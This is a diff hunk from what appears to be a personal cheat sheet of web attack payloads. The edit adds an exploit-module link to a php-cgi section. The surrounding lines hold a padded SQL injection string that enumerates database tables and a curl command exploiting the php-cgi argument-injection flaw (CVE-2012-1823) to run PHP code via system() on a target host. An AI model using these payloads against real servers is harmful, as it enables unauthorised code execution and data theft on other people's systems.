@@ -213,7 +213,7 @@ parse_url('//upload/?/path/to/blah') -> {'host': 'upload?', 'path': '/path/to/bl
 with arg = "' union select table_name from information_schema.tables#".str_repeat('a', 1000000);
 
 # php-cgi
-http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
+http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/ and https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection
 http://vuln.lol/path/?-s
 curl -v 'http://vuln.lol/path/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' -d '<?php system("sleep 30");die(); ?>'
 http://vuln.lol/cgi-bin/php/...
